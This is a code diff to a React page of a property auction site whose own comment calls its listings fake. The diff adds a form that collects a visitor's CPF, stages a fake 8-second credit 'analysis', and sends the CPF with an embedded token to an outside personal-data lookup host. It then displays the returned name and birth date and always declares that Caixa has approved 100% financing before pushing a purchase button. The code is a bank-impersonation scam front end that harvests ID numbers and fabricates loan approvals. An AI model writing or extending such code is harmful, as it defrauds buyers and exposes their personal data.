@@ -4,9 +4,162 @@ import { ArrowLeft, Bed, Bath, Car, ChevronLeft, ChevronRight } from "lucide-rea
 import { Header } from "@/components/layout/header";
 import { Footer } from "@/components/layout/footer";
 import { Button } from "@/components/ui/button";
+import { Input } from "@/components/ui/input";
+import { Label } from "@/components/ui/label";
 import { Skeleton } from "@/components/ui/skeleton";
 import { formatCurrency, formatInstallment } from "@/lib/constants";
 import type { Property } from "@shared/schema";
+
+interface CPFData {
+  cpf: string;
+  nome: string;
+  nome_mae: string;
+  data_nascimento: string;
+  sexo: string;
+}
+
+interface CPFResponse {
+  DADOS: CPFData;
+}
+
+function CPFVerificationForm({ propertyId }: { propertyId: number }) {
+  const [cpf, setCpf] = useState("");
+  const [isVerifying, setIsVerifying] = useState(false);
+  const [verificationResult, setVerificationResult] = useState<CPFData | null>(null);
+  const [error, setError] = useState("");
+  const [countdown, setCountdown] = useState(8);
+
+  const cleanCPF = (cpfValue: string) => {
+    return cpfValue.replace(/\D/g, '');
+  };
+
+  const handleCPFVerification = async () => {
+    if (cpf.length < 14) {
+      setError("Por favor, digite um CPF válido");
+      return;
+    }
+
+    setIsVerifying(true);
+    setError("");
+    setCountdown(8);
+
+    // Countdown timer
+    const countdownInterval = setInterval(() => {
+      setCountdown(prev => {
+        if (prev <= 1) {
+          clearInterval(countdownInterval);
+          return 0;
+        }
+        return prev - 1;
+      });
+    }, 1000);
+
+    try {
+      // Simula 8 segundos de análise
+      await new Promise(resolve => setTimeout(resolve, 8000));
+
+      const cleanedCPF = cleanCPF(cpf);
+      const response = await fetch(`https://consulta.fontesderenda.blog/cpf.php?token=1285fe4s-e931-4071-a848-3fac8273c55a&cpf=${cleanedCPF}`);
+      
+      if (!response.ok) {
+        throw new Error('Erro na verificação');
+      }
+
+      const data: CPFResponse = await response.json();
+      setVerificationResult(data.DADOS);
+    } catch (err) {
+      setError("Erro ao verificar CPF. Tente novamente.");
+    } finally {
+      clearInterval(countdownInterval);
+      setIsVerifying(false);
+      setCountdown(8);
+    }
+  };
+
+  const handleBuyProperty = () => {
+    alert("Redirecionando para finalização da compra...");
+  };
+
+  if (verificationResult) {
+    return (
+      <div className="space-y-4">
+        <div className="bg-green-50 border border-green-200 p-4" style={{borderRadius: '2px'}}>
+          <h5 className="font-semibold text-green-800 mb-2">✅ Financiamento Aprovado!</h5>
+          <div className="text-sm text-green-700 space-y-1">
+            <p><strong>Nome:</strong> {verificationResult.nome}</p>
+            <p><strong>CPF:</strong> {verificationResult.cpf}</p>
+            <p><strong>Data de Nascimento:</strong> {verificationResult.data_nascimento}</p>
+          </div>
+          <p className="text-sm text-green-700 mt-3 font-medium">
+            A Caixa aprovou o financiamento de 100% do valor do imóvel sem entrada para você!
+          </p>
+        </div>
+        
+        <Button 
+          onClick={handleBuyProperty}
+          className="btn w-full py-3 font-semibold" 
+          style={{borderRadius: '2px'}}
+        >
+          Quero comprar esse imóvel
+        </Button>
+      </div>
+    );
+  }
+
+  return (
+    <div className="space-y-4">
+      <div>
+        <Label htmlFor="cpf" className="text-sm font-medium text-gray-700">
+          CPF
+        </Label>
+        <Input
+          id="cpf"
+          type="text"
+          value={cpf}
+          onChange={(e) => {
+            const value = e.target.value;
+            // Aplicar máscara de CPF
+            let formatted = value.replace(/\D/g, '');
+            if (formatted.length >= 4) {
+              formatted = formatted.replace(/(\d{3})(\d)/, '$1.$2');
+            }
+            if (formatted.length >= 7) {
+              formatted = formatted.replace(/(\d{3})\.(\d{3})(\d)/, '$1.$2.$3');
+            }
+            if (formatted.length >= 10) {
+              formatted = formatted.replace(/(\d{3})\.(\d{3})\.(\d{3})(\d)/, '$1.$2.$3-$4');
+            }
+            setCpf(formatted);
+            setError("");
+          }}
+          placeholder="000.000.000-00"
+          maxLength={14}
+          className="mt-1"
+          style={{borderRadius: '2px'}}
+        />
+        {error && (
+          <p className="text-sm text-red-600 mt-1">{error}</p>
+        )}
+      </div>
+
+      <Button 
+        onClick={handleCPFVerification}
+        disabled={isVerifying || cpf.length < 14}
+        className="btn w-full py-3 font-semibold" 
+        style={{borderRadius: '2px'}}
+      >
+        {isVerifying ? (
+          <span className="flex items-center justify-center">
+            <div className="animate-spin rounded-full h-4 w-4 border-b-2 border-white mr-2"></div>
+            Analisando CPF... ({countdown}s)
+          </span>
+        ) : (
+          cpf.length >= 14 ? "Verificar Financiamento" : "Participar do Leilão"
+        )}
+      </Button>
+    </div>
+  );
+}
 
 // Função para obter os dados completos das propriedades fake
 const getPropertyData = (id: number): Property | null => {
@@ -344,11 +497,7 @@ export default function PropertyDetail() {
                   </div>
                 </div>
                 
-                <div className="space-y-3">
-                  <Button className="btn w-full py-3 font-semibold" style={{borderRadius: '2px'}}>
-                    Participar do Leilão
-                  </Button>
-                </div>
+
               </div>
             </div>
           </div>
@@ -372,6 +521,17 @@ export default function PropertyDetail() {
             <h3 className="text-2xl font-bold mb-6">Descrição do Imóvel</h3>
             <div className="bg-white p-6 shadow-lg" style={{borderRadius: '2px'}}>
               <p className="text-gray-700 leading-relaxed">{property.description}</p>
+            </div>
+            
+            <div className="mt-8 p-6" style={{backgroundColor: '#EEF4F5', borderRadius: '2px'}}>
+              <h4 className="text-lg font-semibold text-gray-800 mb-4">
+                Verificação de Financiamento
+              </h4>
+              <p className="text-gray-700 mb-4 text-sm">
+                Informe seu CPF para verificar se a Caixa aprova o financiamento de 100% do valor do imóvel para você.
+              </p>
+              
+              <CPFVerificationForm propertyId={property.id} />
             </div>
           </div>
         </div>
